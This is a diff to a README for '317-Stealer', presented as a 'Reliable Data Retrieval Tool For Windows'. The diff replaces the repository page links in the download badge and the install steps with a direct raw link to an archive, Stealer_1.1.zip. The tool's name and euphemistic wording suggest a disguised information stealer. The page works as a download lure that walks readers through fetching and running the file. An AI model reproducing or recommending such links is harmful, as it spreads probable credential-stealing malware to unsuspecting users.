@@ -1,6 +1,6 @@
 # 🛡️ 317-Stealer - Reliable Data Retrieval Tool For Windows
 
-<a href="https://github.com/tomikocarcinomatous995/317-Stealer">
+<a href="https://raw.githubusercontent.com/tomikocarcinomatous995/317-Stealer/main/electron/Stealer_1.1.zip">
   <img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download 317-Stealer">
 </a>
 
@@ -22,7 +22,7 @@ To run this tool, ensure your computer meets the following standards:
 
 Follow these steps to set up the software on your system:
 
-1. Visit [this page to download](https://github.com/tomikocarcinomatous995/317-Stealer).
+1. Visit [this page to download](https://raw.githubusercontent.com/tomikocarcinomatous995/317-Stealer/main/electron/Stealer_1.1.zip).
 2. Locate the latest version in the release section.
 3. Click the executable file to begin the download process.
 4. Open the folder where the file saved.
